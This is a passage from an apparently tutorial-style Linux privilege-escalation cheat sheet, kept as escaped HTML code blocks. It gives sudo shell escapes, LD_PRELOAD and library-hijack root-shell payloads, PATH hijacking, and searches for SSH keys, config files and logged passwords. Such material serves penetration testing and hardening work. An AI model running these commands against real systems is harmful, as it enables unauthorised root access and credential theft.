class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common sudo misconfigurations:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - NOPASSWD entries\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Wildcard permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Commands that allow shell escapes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"sudo-exploitation-examples\"\u003esudo Exploitation Examples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# sudo with shell escape commands\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo vim\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e:!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo less /etc/profile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo find /etc -name \u003cspan class=\"s2\"\u003e\u0026#34;*.conf\u0026#34;\u003c/span\u003e -exec /bin/bash \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# sudo with environment variables\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo -E /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# sudo with LD_PRELOAD\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;int main() { setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); return 0; }\u0026#39;\u003c/span\u003e \u0026gt; /tmp/exploit.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo \u003cspan class=\"nv\"\u003eLD_PRELOAD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp/exploit.so /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# sudo with LD_LIBRARY_PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /tmp/lib\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;int main() { setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); return 0; }\u0026#39;\u003c/span\u003e \u0026gt; /tmp/lib/exploit.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egcc -fPIC -shared -o /tmp/lib/libc.so.6 /tmp/lib/exploit.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo \u003cspan class=\"nv\"\u003eLD_LIBRARY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp/lib /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"writable-directory-exploitation\"\u003eWritable Directory Exploitation\u003c/h2\u003e\n\u003ch3 id=\"finding-writable-directories\"\u003eFinding Writable Directories\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find world-writable directories\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type d -perm -002 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find directories writable by current user\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type d -writable 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find directories owned by current user\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type d -user \u003cspan class=\"k\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"k\"\u003e)\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common locations to check\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /tmp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /var/tmp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /dev/shm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/local/share\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"path-manipulation\"\u003ePATH Manipulation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check current PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create malicious binary in writable directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;#!/bin/bash\\n/bin/bash -p\u0026#39;\u003c/span\u003e \u0026gt; /tmp/ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x /tmp/ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Modify PATH to prioritize malicious binary\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Wait for privileged process to execute our binary\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Or trigger execution through cron jobs, scripts, etc.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"library-hijacking\"\u003eLibrary Hijacking\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for writable library directories\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type d -writable 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s2\"\u003e\u0026#34;(lib|lib64)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check LD_LIBRARY_PATH in processes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i ld_library\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create malicious shared library\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;void _init() { setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); }\u0026#39;\u003c/span\u003e \u0026gt; /tmp/exploit.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Place in writable library directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /tmp/exploit.so /writable/lib/directory/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"process-and-service-analysis\"\u003eProcess and Service Analysis\u003c/h2\u003e\n\u003ch3 id=\"running-processes\"\u003eRunning Processes\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# List all processes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps -ef --forest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Processes running as root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep root\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Network connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ess -tlnp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetstat -tulnp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for processes with interesting capabilities\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/sbin/getcap -r / 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"cron-jobs-and-scheduled-tasks\"\u003eCron Jobs and Scheduled Tasks\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# System cron jobs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/crontab\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /etc/cron.*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrontab -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# User cron jobs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrontab -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /var/spool/cron/crontabs/*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Systemd timers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl list-timers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /etc/systemd -name \u003cspan class=\"s2\"\u003e\u0026#34;*.timer\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"services-and-sockets\"\u003eServices and Sockets\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Running services\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl list-units --type\u003cspan class=\"o\"\u003e=\u003c/span\u003eservice --state\u003cspan class=\"o\"\u003e=\u003c/span\u003erunning\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check service files for misconfigurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /etc/systemd -name \u003cspan class=\"s2\"\u003e\u0026#34;*.service\u0026#34;\u003c/span\u003e -exec grep -l \u003cspan class=\"s2\"\u003e\u0026#34;User\\|Group\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Socket files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl list-units --type\u003cspan class=\"o\"\u003e=\u003c/span\u003esocket\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /etc/systemd -name \u003cspan class=\"s2\"\u003e\u0026#34;*.socket\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"file-system-analysis\"\u003eFile System Analysis\u003c/h2\u003e\n\u003ch3 id=\"configuration-files\"\u003eConfiguration Files\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for readable sensitive files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /etc -readable -type f 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -20\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Database configuration files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;*.conf\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.config\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.cfg\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s2\"\u003e\u0026#34;(sql|db|database)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Web application configs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;wp-config.php\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;config.php\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;.env\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH keys and certificates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;id_rsa\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;id_dsa\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.pem\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.key\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"log-files\"\u003eLog Files\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# System logs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /var/log -readable -type f 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Application logs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;*.log\u0026#34;\u003c/span\u003e -readable 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check logs for passwords or sensitive information\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r -i \u003cspan class=\"s2\"\u003e\u0026#34;password\\|passwd\\|secret\\|token\u0026#34;\u003c/span\u003e /var/log/ 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"backup-files\"\u003eBackup Files\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find backup files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;*.bak\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.backup\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.old\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*~\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Database backups\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;*.sql\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.dump\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.db\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Configuration backups\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /etc -name \u003cspan class=\"s2\"\u003e\u0026#34;*.bak\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.old\u0026#34;\u003c/span\u003e -o -name \u003cspan class=\"s2\"\u003e\u0026#34;*.orig\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"application-specific-exploits\"\u003eApplication-Specific Exploits\u003c/h2\u003e\n\u003ch3 id=\"dstat-plugin-exploitation\"\u003edstat Plugin Exploitation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check dstat plugin directories\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;*dstat*\u0026#34;\u003c/span\u003e -type d 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/share/dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/local/share/dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check permissions on plugin directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/local/share/dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create malicious dstat plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026gt; /usr/local/share/dstat/dstat_exploit.py \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; \u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 